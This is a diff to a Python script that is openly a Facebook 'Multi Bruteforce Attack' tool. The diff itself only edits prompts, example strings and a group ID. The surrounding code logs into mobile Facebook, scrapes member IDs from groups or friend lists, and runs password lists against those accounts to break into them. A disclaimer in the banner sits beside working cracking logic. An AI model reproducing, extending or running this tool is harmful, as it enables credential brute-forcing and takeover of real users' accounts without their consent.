@@ -89,7 +89,7 @@ def simpan():
 		except:
 			tampil('\rm[!]Failed to save')
 def buka(d):
-	tampil('\rh[*]Loading friends ids \rp'+d)
+	tampil('\rh[*]Loading ids \rp'+d)
 	try:
 		x = br.open(d)
 		br._factory.is_html = True
@@ -117,7 +117,7 @@ def login():
 		buka('https://mobile.facebook.com/home.php')
 		nama = br.find_link(url_regex='logout.php').text
 		nama = re.findall(r'\((.*a?)\)',nama)[0]
-		tampil('\rh[*]welcome\rk%s\n\rh[*]Best of Luck....'%nama)
+		tampil('\rh[*]welcome\rk%s\n\rh[*]check group link for group id...'%nama)
 		log = 1
 	elif 'checkpoint' in url:
 		tampil('\rm[!]Account gets Checkpoint\n\rk[!]try logining with opera')
@@ -140,7 +140,7 @@ def saring_id_group1(d):
 def saring_id_group0():
 	global id_group
 	while 1:
-		id_group = inputD('[?]group id')
+		id_group = inputD('[?]group id >EX> 488575521641382')
 		tampil('\rh[*]Check the group....')
 		a = buka('https://m.facebook.com/browse/group/members/?id='+id_group+'&amp;start=0&amp;listType=list_nonfriend&amp;refid=18&amp;_rdc=1&amp;_rdr')
 		nama = ' '.join(re.findall(r'<title>(.*?)</title>',a)[0].split()[1:])
@@ -150,7 +150,7 @@ def saring_id_group0():
 		except:
 			tampil('\rm[!]group id is incoreccet')
 			continue
-	tampil('\rh[*]Clone same pass ids from group \rc%s'%nama)
+	tampil('\rh[*]Clone same passwrd ids from group \rc%s'%nama)
 	saring_id_group1(a)
 	return next
 def idgroup():
@@ -227,11 +227,12 @@ def crack(d):
 	i = inputD('[?]use Passwordlist/Manual (p/m)',['P','M'])
 	if i.upper() == 'P':
 		while 1:
-			dir = inputD('[?]Enter file path')
+			dir = inputD('[?]asswrdfile path >>Ex>> /sdcard/file.txt')
+				    
 			try:
 				D = open(dir,'r').readlines()
 			except:
-                                tampil('\rm[!]Enter file path%s'%dir)
+                                tampil('\rm[!]passwrdfile path >>Ex>> /sdcard/file.txt%s'%dir)
 				continue
 			break
 		tampil('\rh[*]start crack with \rk%d password'%len(D))
@@ -318,7 +319,7 @@ def lanjutT():
 def lanjutG():
 	global fid_bgroup
 	if len(fid_bgroup) != 0:
-		i = inputD('[?]clone ids from frendlist/start? (y/n)',['Y','N'])
+		i = inputD('[?]clone ids from groups/start? (y/n)',['Y','N'])
 		if i.upper() == 'N':
 			return crack(fid_bgroup)
 		else:
@@ -339,12 +340,12 @@ def menu():
 \rk############################################################
 #            \rb*Multi Bruteforce Attack*\rk                   ##
 # \rhCredit goes tot\r     #   Anas chawdhary...Dnt copy      \rk#
-# \rhfb group\rp  https://m.facebook.com/groups/488575521641482 \rk#
+# \rhfb group\rp  https://m.facebook.com/groups/488575521641382 \rk#
 # \rhGitHub\rp      https://github.com/Chawdhary007          \rk#
 #       \rmDo Not Use This Tool For IllegaL Purpos \rk         ##
 ##############################################################''')
 	tampil('''\rk%s\n\rc1 clone ids from group\n\rc2 clone ids from friendlist\n\rc3 Exit\n\rk%s'''%('#'*20,'#'*20))
-	i = inputM('[?]Choice',[1,2,3])
+	i = inputM('[?]Choose',[1,2,3])
 	if i == 1:
 		lanjutG()
 		idgroup()
